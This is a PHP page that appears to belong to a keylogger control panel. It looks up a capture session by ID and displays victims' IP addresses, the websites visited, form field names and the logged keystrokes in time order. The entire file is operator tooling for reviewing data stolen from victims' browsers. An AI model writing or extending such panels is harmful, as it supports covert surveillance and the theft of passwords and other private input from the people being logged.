<?php
require_once ('includes/functions.php');

$login = new Login();
$template = new Template();

if (!$login->loggedIn()) {
    $template->showLogin();
}

$sid = $_GET["id"];

$db->bind("keylog_id", $sid);

$keylogData = $db->query("SELECT cl.client_id, cl.ip, kl.client_id, kl.keylog_id, kl.page_load, kl.website, kl.field_name, kl.keylog_data, kl.time FROM clients AS cl JOIN keylogger AS kl ON cl.client_id = kl.client_id WHERE kl.keylog_id = :keylog_id ORDER BY kl.time ASC ");

$data["data"] = $keylogData;
$data["info"] = array(
    "website" => $keylogData[0]["website"],
    "ip" => $keylogData[0]["ip"],
);

$template->showHeader("Keylogger Data");

$template->showKeylog($data);

$template->showFooter();
?>